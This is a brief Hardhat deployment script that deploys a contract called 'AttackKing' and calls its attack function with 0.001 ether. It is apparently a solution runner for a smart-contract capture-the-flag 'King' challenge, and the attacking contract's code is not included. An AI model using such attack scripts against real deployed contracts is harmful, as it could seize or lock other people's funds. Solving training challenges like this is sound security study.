const { ethers } = require("hardhat");


async function main() {
    const attackFactory = await ethers.getContractFactory('AttackKing');
    const attack = await attackFactory.deploy();
    await attack.deployed();
    console.log("Deployed to: ", attack.address);

    const tx = await attack.attack({value: ethers.utils.parseEther("0.001")});
    await tx.wait();
    console.log("Complete");
}

main()
.then(() => process.exit(0))
.catch((error) => {
    console.error(error);
    process.exit(1);
})